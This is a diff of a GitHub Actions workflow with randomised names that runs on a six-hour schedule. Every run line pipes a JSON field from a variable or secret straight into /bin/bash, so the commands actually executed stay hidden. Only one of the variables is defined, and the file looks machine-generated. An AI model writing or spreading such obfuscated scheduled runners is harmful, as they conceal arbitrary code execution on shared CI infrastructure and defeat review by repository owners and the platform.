@@ -2,8 +2,8 @@ name: aboardsoil
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
-jobs:  # 16697
+    - cron: '29 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +11,16 @@ jobs:  # 16697
       - uses: actions/checkout@v4
       - name: aboardsoil
         env:
-          fybi746: ${{ secrets.fybi746 }}
+          zosv0134: ${{ secrets.zosv0134 }}
         run: |
-          echo $fybi746 | jq -r .izv06921 | /bin/bash
-          echo $rsqzm86 | jq -r .hy335 | /bin/bash
-          echo $e8876 | jq -r .qiq346 | /bin/bash
-          echo $ei39723 | jq -r .bnx4 | /bin/bash
-          echo $hboi9 | jq -r .dk66161 | /bin/bash
-          echo $upejd86768 | jq -r .dn890 | /bin/bash
+          echo $zosv0134 | jq -r .k75387 | /bin/bash
+          echo $e8 | jq -r .qtoo1 | /bin/bash
+          echo $hul7551 | jq -r .zaui6240 | /bin/bash
+          echo $v88 | jq -r .uw07044 | /bin/bash
+          echo $uwtjo05 | jq -r .d6 | /bin/bash
+          echo $gbd6 | jq -r .kia95804 | /bin/bash
+          echo $dfg36 | jq -r .kji433 | /bin/bash
+          echo $g85563 | jq -r .tnv14 | /bin/bash
+          echo $z96198 | jq -r .fdsgj85021 | /bin/bash
+          echo $rkn25 | jq -r .otru9877 | /bin/bash
 
